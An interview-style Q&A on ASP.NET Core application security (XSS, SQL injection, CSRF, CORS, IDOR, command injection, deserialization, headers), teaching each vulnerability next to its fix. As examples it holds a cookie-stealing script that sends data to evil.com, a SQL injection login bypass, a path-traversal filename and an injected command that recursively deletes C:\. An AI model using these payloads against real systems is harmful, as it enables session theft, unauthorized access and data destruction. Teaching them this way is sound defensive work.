# App Security — Q&A

## Beginner — Question 1

**Q1: What is the difference between Hashing and Encryption?**

Both are cryptographic concepts used to secure data, but they serve different purposes.

**Hashing:**
- **Mechanism:** Takes an input of any size and produces a fixed-length string of characters (a hash). 
- **Key Property:** It is a **one-way function**. You cannot take a hash and reverse it back to the original text.
- **Use Case:** Storing passwords. You hash the user's password during registration. When they log in, you hash the password they entered and compare the two hashes. If they match, the password is correct, but the database never stores the actual password.
- **Algorithms:** SHA-256, BCrypt, Argon2.

**Encryption:**
- **Mechanism:** Takes plaintext and a cryptographic key, and converts it into ciphertext.
- **Key Property:** It is a **two-way function**. You can reverse the ciphertext back to plaintext *if* you have the correct decryption key.
- **Use Case:** Securing data in transit (TLS) or data at rest (encrypting a database disk) where you eventually need to read the original data again.
- **Algorithms:** AES (Symmetric), RSA (Asymmetric).

#### Follow-up: What is a "Salt" in password hashing?
A salt is a random string of characters added to a password *before* it is hashed. It ensures that if two users have the exact same password ("password123"), their resulting hashes will look completely different in the database. This prevents attackers from using precomputed "Rainbow Tables" to crack hashes. Modern hashing algorithms (like BCrypt) handle salting automatically.

---

## Intermediate — Question 1

**Q1: Explain Cross-Site Scripting (XSS) and how to prevent it.**

XSS is a vulnerability where an attacker injects malicious client-side JavaScript into a trusted website viewed by other users. 

**The Mechanism:**
Imagine a blog where users can post comments. An attacker posts a comment containing: `<script>fetch('http://evil.com/steal?cookie=' + document.cookie);</script>`.
If the server saves this to the database without sanitization, and then renders it directly onto the HTML page for other users to see, their browsers will execute the script. The script steals their session cookies and sends them to the attacker.

**Prevention in ASP.NET Core:**
1. **Output Encoding (Default):** The primary defense. Razor (`@Model.Comment`) automatically HTML-encodes all output. It converts `<script>` into `&lt;script&gt;`. The browser renders it as text on the screen, but refuses to execute it as code. 
2. **Never trust `Html.Raw()`:** Only use this if you explicitly want to render HTML and you have strictly sanitized the input using a library like HTMLSanitizer.
3. **Content Security Policy (CSP):** An HTTP header that tells the browser which domains it is allowed to load scripts from, completely blocking inline injected scripts.

---

## Intermediate — Question 2

**Q2: Explain SQL Injection (SQLi) and how ORMs like EF Core prevent it.**

SQL Injection is an attack where malicious SQL statements are inserted into entry fields for execution (e.g., to dump the database contents to the attacker).

**The Mechanism:**
If a developer builds a query by concatenating strings:
```csharp
string query = "SELECT * FROM Users WHERE Username = '" + username + "'";
```
An attacker could input `admin' --`. The resulting query becomes:
```sql
SELECT * FROM Users WHERE Username = 'admin' --'
```
The `--` comments out the rest of the query, logging the attacker in as admin without a password.

**Prevention (Parameterized Queries):**
Instead of concatenating strings, you use parameters. The database driver treats the parameter strictly as data, not as executable code.
Entity Framework Core uses parameterized queries by default for all LINQ queries:
```csharp
// Completely safe from SQLi. EF Core parametrizes the 'username' variable.
var user = _db.Users.SingleOrDefault(u => u.Username == username);
```
**Common Pitfall:** Using `FromSqlRaw` in EF Core and manually concatenating the string into it. Always use `FromSqlInterpolated` instead, which safely parametrizes the interpolated variables.

---

## Advanced — Question 1

**Q1: What is Cross-Site Request Forgery (CSRF) and how do Anti-Forgery Tokens mitigate it?**

CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.

**The Mechanism:**
1. You log into your banking site (`bank.com`). Your browser stores an auth cookie.
2. You browse to a malicious site (`evil.com`).
3. `evil.com` contains a hidden form that automatically submits a POST request to `bank.com/transfer?amount=1000&to=Attacker`.
4. Because the browser automatically attaches cookies to outgoing requests, it attaches your `bank.com` auth cookie to this request.
5. The bank server receives the request, sees your valid cookie, and executes the transfer.

**Mitigation (Anti-Forgery Tokens):**
ASP.NET Core uses the Synchronizer Token Pattern to prevent this.
1. When the server renders an HTML form, it generates a unique, cryptographically secure token and embeds it as a hidden `<input>` field in the form. It also sets a matching token in an encrypted cookie.
2. When the user submits the form, the server compares the token in the form payload against the token in the cookie. 
3. If `evil.com` forces a POST request, they cannot read the anti-forgery token from the `bank.com` page due to the Same-Origin Policy. Therefore, their POST request will lack the form payload token. The server rejects the request.

#### Follow-up: Why are CSRF tokens less necessary for APIs using JWTs?
CSRF relies entirely on the fact that browsers *automatically* attach Cookies to cross-origin requests. If your SPA (React/Angular) uses a JWT stored in memory or LocalStorage, the browser does not attach it automatically. The JavaScript code must explicitly read the token and attach it to the `Authorization` header. Since `evil.com` cannot execute JavaScript on your domain to read your LocalStorage, they cannot construct a forged request with the JWT.

---

## Scenario — Question 1

**Q1: You discover your ASP.NET Core API is vulnerable to Cross-Origin Resource Sharing (CORS) exploits because `builder.Services.AddCors()` is configured with `.AllowAnyOrigin()`. How do you properly secure it?**

CORS is a browser security feature that restricts cross-origin HTTP requests. If your API runs on `api.example.com` and your React app runs on `www.example.com`, the browser blocks the React app from calling the API unless the API explicitly returns headers saying "I allow `www.example.com`".

**The Danger of `AllowAnyOrigin()`:**
If you allow any origin (`*`), then *any* website in the world (`evil.com`) can make background AJAX requests to your API. If your API relies on cookies for authentication, `evil.com` can perform CSRF-style attacks and read the JSON responses (something CSRF normally cannot do).

**Proper Security Configuration:**
You must explicitly define the Exact Origins allowed in your `Program.cs`.

```csharp
builder.Services.AddCors(options =>
{
    options.AddPolicy("StrictPolicy", policy =>
    {
        policy.WithOrigins(
                "https://www.example.com", 
                "https://admin.example.com"
              )
              .AllowAnyHeader()
              .AllowAnyMethod()
              .AllowCredentials(); // Critical if using Cookies or Windows Auth
    });
});

// Later in pipeline:
app.UseCors("StrictPolicy");
```

**Common Pitfall:**
When using `.AllowCredentials()` (required if you are sending authentication cookies or headers), the CORS specification strictly prohibits using `.AllowAnyOrigin()`. You *must* specify explicit origins. Also, ensure you do not use trailing slashes in your origins (`https://example.com/` is invalid).

---

## Scenario — Question 2

**Q2: A developer on your team suggests storing the database connection string and API keys in a `.env` file and checking it into a private GitHub repository, arguing that the repository is private so the secrets are safe. Why is this a bad idea, and what is the secure alternative?**

Checking secrets into source control, even a private repository, is a critical security vulnerability. 

**The Risks:**
1. **Access Creep:** Anyone who ever gets read access to the repository (interns, contractors, CI/CD tools, external auditors) immediately gets full access to production databases.
2. **Leakage:** If the repository is ever made public, cloned to a compromised laptop, or if GitHub itself is breached, the keys are instantly compromised.
3. **Immutability of Git:** Once a secret is committed, it exists in the Git history forever. Simply deleting the `.env` file in the next commit does not remove the secret from the repository's history.

**The Secure Solution:**
Secrets should never touch the disk of the developer or the source code repository. They should be injected at runtime.

1. **Local Development:** Use the .NET **Secret Manager** (`dotnet user-secrets`). This stores secrets in a local JSON file in the developer's user profile directory (outside the project folder), ensuring they are never accidentally committed to source control.
2. **CI/CD Pipeline:** Inject secrets into the build/deploy pipeline using GitHub Actions Secrets or Azure DevOps Variable Groups.
3. **Production Environment:** Store the secrets in a dedicated vault, such as **Azure Key Vault** or AWS Secrets Manager. Configure the ASP.NET Core application to use Managed Identities to silently authenticate with the Key Vault on startup, download the secrets into memory, and inject them into the `IConfiguration` system.

```csharp
// Program.cs - Securely loading from Key Vault
var keyVaultUri = new Uri($"https://{builder.Configuration["KeyVaultName"]}.vault.azure.net/");
builder.Configuration.AddAzureKeyVault(keyVaultUri, new DefaultAzureCredential());
```

---

## Scenario — Question 3

**Q3: You are building an enterprise file upload portal where users can submit PDF reports. A malicious user uploads a file named `report.pdf`, but it is actually a disguised `.exe` file containing malware. If your server blindly saves it, it could compromise the system or other users. How do you securely handle file uploads?**

Relying on the file extension (`.pdf`) or the MIME type provided by the browser (`Content-Type`) is completely insecure, as both can be easily spoofed by an attacker using tools like Postman or Burp Suite.

**The Secure File Upload Strategy:**

1. **Validate Magic Numbers (File Signatures):**
   Instead of trusting the extension, you must read the first few bytes of the file stream (the "magic numbers"). For example, a valid PDF *always* starts with the hex signature `25 50 44 46` (`%PDF`). If the signature doesn't match the expected type, reject the file immediately.

2. **Never Execute Uploaded Files:**
   Ensure the directory where files are stored does not have execute permissions. If saving to a cloud provider (Azure Blob Storage), ensure the blob container is strictly for static files and cannot execute server-side code.

3. **Rename the File:**
   Never save the file using the original file name provided by the user (which could contain path traversal attacks like `../../../windows/system32/cmd.exe` or malicious scripts). Generate a random GUID for the file name on your server and store the mapping in a database.

4. **Virus Scanning:**
   For high-security applications, intercept the upload stream and pass it through an anti-malware service (like ClamAV or an Azure Defender hook) before it is permanently persisted to disk or cloud storage.

---

## Scenario — Question 4

**Q4: You are building an API endpoint to download customer invoices: `GET /api/invoices/{invoiceId}`. A logged-in user successfully downloads their invoice by calling `GET /api/invoices/1042`. However, they then change the URL to `GET /api/invoices/1043` and successfully download another customer's invoice. What is this vulnerability called, and how do you prevent it?**

This is an **Insecure Direct Object Reference (IDOR)** vulnerability, which is a type of Broken Access Control. It is one of the most common and critical security flaws in web APIs.

**The Flaw:**
The application checks if the user is authenticated (they are logged in), but it fails to check if the user is *authorized* to access the specific requested resource (Invoice 1043). The backend code probably looks like this:
```csharp
[Authorize]
[HttpGet("{id}")]
public IActionResult GetInvoice(int id) {
    var invoice = _db.Invoices.Find(id); // VULNERABILITY!
    return Ok(invoice);
}
```

**The Prevention:**
You must always validate ownership at the data access level before returning a resource.

1. **Check Ownership:** Extract the currently logged-in user's ID from the JWT token claims, and include it in the database query.
```csharp
[Authorize]
[HttpGet("{id}")]
public IActionResult GetInvoice(int id) {
    var userId = int.Parse(User.FindFirst(ClaimTypes.NameIdentifier).Value);
    
    // The query now strictly enforces ownership
    var invoice = _db.Invoices.SingleOrDefault(i => i.Id == id && i.UserId == userId);
    
    if (invoice == null) {
        // Return 404 Not Found (or 403 Forbidden) so attackers can't even tell if the invoice exists
        return NotFound(); 
    }
    return Ok(invoice);
}
```
2. **Use GUIDs/UUIDs (Defense in Depth):** While ownership validation is the primary fix, replacing predictable integer IDs (`1042`, `1043`) with unpredictable GUIDs (`d3b07384-d9a...`) makes it mathematically impossible for an attacker to guess another user's invoice ID in the first place. However, GUIDs do *not* replace the need for proper ownership checks.

---

## Scenario — Question 5

**Q5: A developer uses the `MD5` hashing algorithm to store user passwords in the database because it is very fast. A database backup is stolen by hackers. Within 10 minutes, the hackers have cracked 90% of the passwords. Why did this happen, and what hashing algorithm characteristic was missing?**

This represents a critical failure in cryptographic design.

**The Flaw:**
MD5 (and SHA-1, SHA-256) are **Message Digest** algorithms designed for data integrity and speed. They are deliberately extremely fast. An off-the-shelf gaming GPU can calculate billions of MD5 hashes per second.
When the database is stolen, the hackers don't guess passwords by hand. They use a dictionary of 10 billion common passwords, hash all of them using MD5, and compare the results to the stolen database. Because MD5 is so fast, cracking the database takes minutes.

**The Solution: Key Derivation Functions (KDFs)**

Password hashing requires algorithms that are deliberately **slow and computationally expensive** (often called "Work Factor" or "Key Stretching").

1. **Use BCrypt, Argon2, or PBKDF2:** These algorithms are specifically designed for passwords.
2. **Work Factor:** They include a configurable "cost" parameter. You configure the algorithm so that hashing a single password takes exactly 250 milliseconds on your server.
3. **The Result:** 250ms is unnoticeable to a user logging in. However, if a hacker steals the database, it now takes them 250ms to test a single guess. Testing a dictionary of 10 billion passwords would now take hundreds of years instead of 10 minutes, rendering the stolen database useless.

---

## Beginner — Question 2

**Q2: What is Command Injection, and how do you prevent it in a .NET application that shells out to external processes?**

Command Injection occurs when untrusted user input is concatenated into a string that's passed to the operating system's shell for execution, letting an attacker append their own commands to whatever the application intended to run.

**The vulnerable pattern:**
```csharp
// A "convert this file" feature that shells out to ffmpeg
string fileName = Request.Query["file"]; // attacker-controlled
Process.Start("cmd.exe", $"/c ffmpeg -i {fileName} output.mp4");
```
An attacker supplies `file = "video.mp4 & del /Q /S C:\\* &"` — the shell happily executes the `ffmpeg` command *and* the attacker's appended `del` command, because the shell doesn't distinguish "the intended argument" from "extra shell syntax" once they're concatenated into one string.

**Prevention — never build a shell command string from untrusted input; pass arguments as a discrete array instead:**
```csharp
var psi = new ProcessStartInfo
{
    FileName = "ffmpeg",
    ArgumentList = { "-i", fileName, "output.mp4" }, // each element passed as a SEPARATE argument
    UseShellExecute = false, // critical: bypasses the shell entirely, no shell metacharacter parsing
};
Process.Start(psi);
```
Using `ArgumentList` (rather than a single concatenated `Arguments` string) passes each value directly to the process as a discrete argument, without ever invoking a shell to *parse* the string — so shell metacharacters like `&`, `|`, or `;` in `fileName` are treated as a literal, inert part of the filename argument, not as command separators.

**Additional layer — validate the input itself:** even with `ArgumentList`, still validate that `fileName` matches an expected pattern (e.g., a GUID plus a known extension) rather than trusting arbitrary user-supplied strings as file paths, since a validated allowlist is more robust than relying solely on correct argument-passing mechanics.

**Common Pitfall:** assuming `UseShellExecute = false` alone is sufficient while still building a single concatenated `Arguments` string — some process invocations still perform limited interpretation of that string depending on the target executable; using the `ArgumentList` collection is the more robust fix than trying to manually escape shell metacharacters yourself.

---

## Intermediate — Question 3

**Q3: What is Insecure Deserialization, and how can it lead to Remote Code Execution (RCE) in a .NET application?**

Insecure Deserialization occurs when an application deserializes untrusted data using a format/library capable of reconstructing *arbitrary types* — including types with constructors, property setters, or `Dispose()` methods that execute attacker-chosen code as a side effect of the deserialization process itself, before the application even uses the resulting object.

**The vulnerable pattern — `BinaryFormatter` (deserializing arbitrary types by design):**
```csharp
// NEVER do this with untrusted input
var formatter = new BinaryFormatter();
using var stream = new MemoryStream(untrustedBytes); // e.g., from a cookie or uploaded file
var obj = formatter.Deserialize(stream); // can instantiate ANY type present in loaded assemblies
```
`BinaryFormatter` (and similarly, insecure configurations of `Newtonsoft.Json` with `TypeNameHandling.All`) embeds the *type name* to construct directly inside the serialized payload — an attacker crafts a payload naming a type already loaded in your application's dependencies (a "gadget chain") whose constructor or property setters have a side effect like writing a file, starting a process, or worse, chained together into full code execution. This is why `BinaryFormatter` is now officially obsolete and blocked by default in modern .NET.

**Prevention — deserialize into a specific, known type; never let the payload dictate what type gets constructed:**
```csharp
// Safe: System.Text.Json requires you to specify the target type up front
var order = JsonSerializer.Deserialize<OrderDto>(untrustedJson);
// The deserializer only ever populates properties of the KNOWN OrderDto type --
// it cannot be tricked into instantiating an arbitrary attacker-chosen type
```
`System.Text.Json`'s default behavior (and `Newtonsoft.Json` with default settings, `TypeNameHandling.None`) only populates properties of the type *you* specify at the call site — the payload has no ability to dictate what class gets constructed, eliminating the gadget-chain attack surface entirely.

**Common Pitfall:** enabling `TypeNameHandling.Auto` or `TypeNameHandling.All` in Newtonsoft.Json "to support polymorphic deserialization" without restricting it to a strict, known allowlist of safe types via a custom `SerializationBinder` — this setting is specifically what re-introduces the arbitrary-type-instantiation vulnerability that `System.Text.Json`'s stricter default design avoids by not supporting it at all.

---

## Advanced — Question 2

**Q2: What are the key HTTP security headers (HSTS, X-Content-Type-Options, X-Frame-Options, CSP), and how do you configure them in ASP.NET Core?**

These headers instruct the *browser* to enforce additional restrictions on how it handles your site's content — a defense-in-depth layer that mitigates entire attack classes even if some other part of the application has a bug.

**Configuring them together via middleware:**
```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers.Append("X-Content-Type-Options", "nosniff");
    context.Response.Headers.Append("X-Frame-Options", "DENY");
    context.Response.Headers.Append("Content-Security-Policy",
        "default-src 'self'; script-src 'self'; frame-ancestors 'none'");
    await next();
});

app.UseHsts(); // adds Strict-Transport-Security automatically (ASP.NET Core built-in middleware)
```

**What each header actually prevents:**
- **`Strict-Transport-Security` (HSTS)** — tells the browser "always use HTTPS for this domain, even if the user types `http://` or clicks an `http://` link, for the next N seconds." This closes the window for an SSL-stripping man-in-the-middle attack on a public Wi-Fi network, where an attacker would otherwise silently downgrade the user's first request to plain HTTP before they ever reach your server.
- **`X-Content-Type-Options: nosniff`** — stops the browser from "MIME-sniffing" a response's content type based on its bytes rather than trusting the declared `Content-Type` header. Without it, a file uploaded as an "image" that actually contains HTML/JavaScript could get interpreted and executed as a script by the browser in certain contexts, bypassing content-type-based upload restrictions.
- **`X-Frame-Options: DENY`** — prevents your pages from being embedded inside an `<iframe>` on another site, which is the core defense against **Clickjacking** (a malicious site overlaying invisible buttons on top of your legitimately-rendered page, tricking users into clicking things they didn't intend to).
- **`Content-Security-Policy` (CSP)** — the broadest of the four; explicitly whitelists which sources scripts, styles, and other resources are allowed to load from, providing a second layer of XSS defense even if an injection point somehow bypasses output encoding — an injected `<script src="https://evil.com/steal.js">` simply won't execute if CSP's `script-src` doesn't permit `evil.com`.

**Common Pitfall:** enabling `UseHsts()` in a project still served over plain HTTP during local development or in an environment without a valid TLS certificate — once a browser receives an HSTS header, it refuses to connect over plain HTTP for that domain for the specified duration, which can lock developers out of a local `http://` dev server unless HSTS is conditionally applied only in genuinely HTTPS-served environments.

---
